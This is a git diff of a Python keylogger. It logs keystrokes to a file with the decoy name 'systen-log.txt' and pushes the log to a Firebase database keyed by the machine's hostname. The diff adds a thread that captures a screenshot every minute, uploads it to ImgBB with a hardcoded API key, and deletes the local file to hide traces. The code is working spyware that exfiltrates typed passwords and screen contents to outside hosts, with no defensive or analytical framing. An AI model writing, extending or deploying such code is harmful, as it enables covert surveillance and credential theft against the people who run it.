@@ -1,14 +1,22 @@
-from pynput.keyboard import Key, Listener
 import os
-from datetime import datetime
 import requests
+from datetime import datetime
 import socket
 import threading
 import time
+from PIL import ImageGrab  # For taking screenshots
+from pynput.keyboard import Key, Listener  # For keyboard listener
 
+# Firebase URL
 firebase_url = 'https://project-runnner-default-rtdb.firebaseio.com/'
-log_file = "keylog.txt"
+
+# Log file and hostname
+log_file = "systen-log.txt"
 hostname = socket.gethostname()
+screenshot_folder = "ss"  # Folder for screenshots
+
+# ImgBB API key
+api_key = 'de7994d6d49af160676a69e6c10e3026'
 
 # Function to check internet availability
 def is_internet_available():
@@ -18,11 +26,11 @@ def is_internet_available():
     except (socket.timeout, socket.error):
         return False
 
-# Function to upload the log file to Firebase
+# Function to upload log data to Firebase
 def upload_log():
     with open(log_file, 'r') as file:
         content = file.read().strip()
-    
+
     # Check if the log file has only the new log marker
     new_log_marker = f"** New logging started at"
     if content.startswith(new_log_marker) and content.count(new_log_marker) == 1 and len(content.split("\n")) == 1:
@@ -32,12 +40,12 @@ def upload_log():
     if not is_internet_available():
         print("Internet not available, skipping upload.")
         return False
-    
-    db_path = f'users/{hostname}/{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.json'
+
+    db_path = f'users/{hostname}/keylog/{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.json'
     with open(log_file, 'r') as file:
         file_data = file.read()
     data_to_upload = {'runnner': file_data}
-    
+
     try:
         response = requests.put(firebase_url + db_path, json=data_to_upload)
         if response.status_code == 200:
@@ -69,6 +77,36 @@ def periodic_upload():
             print("Upload failed or not needed. Retrying in 1 minute.")
         time.sleep(60)  # Wait for 1 minute before the next attempt
 
+# Function to periodically take screenshots every 1 minute
+def periodic_screenshots():
+    os.makedirs(screenshot_folder, exist_ok=True)  # Ensure the screenshot folder exists
+    while True:
+        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        screenshot_path = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
+        try:
+            screenshot = ImageGrab.grab()
+            screenshot.save(screenshot_path)
+            print(f"Screenshot saved at {screenshot_path}")
+            upload_image_to_imgbb(screenshot_path)  # Upload screenshot after saving it
+            os.remove(screenshot_path)  # Delete the image after upload
+        except Exception as e:
+            print(f"Failed to take screenshot: {e}")
+        time.sleep(60)  # Wait for 1 minute before the next screenshot
+
+# Function to upload the screenshot to ImgBB
+def upload_image_to_imgbb(image_path):
+    with open(image_path, 'rb') as image_file:
+        files = {'image': image_file}
+        params = {'key': api_key}
+        response = requests.post('https://api.imgbb.com/1/upload', files=files, params=params)
+    
+    if response.status_code == 200:
+        response_json = response.json()
+        image_url = response_json['data']['url']
+        print(f"Uploaded {image_path} to ImgBB. URL: {image_url}")
+    else:
+        print(f"Failed to upload {image_path}. Response: {response.text}")
+
 # Debounce settings for keystrokes
 recent_keys = {}
 debounce_time = 0.2
@@ -85,7 +123,7 @@ def write_to_file(key):
         key_str = "\n"
     elif key == Key.backspace:
         key_str = "[BS]"
-    
+
     if key_str and (current_time - recent_keys.get(key_str, 0)) > debounce_time:
         with open(log_file, "a") as file:
             file.write(key_str)
@@ -117,6 +155,11 @@ if __name__ == "__main__":
     upload_thread = threading.Thread(target=periodic_upload, daemon=True)
     upload_thread.start()
 
+    # Start periodic screenshot capture in a separate thread
+    screenshot_thread = threading.Thread(target=periodic_screenshots, daemon=True)
+    screenshot_thread.start()
+
     # Keep the main thread running
     listener_thread.join()
     upload_thread.join()
+    screenshot_thread.join()
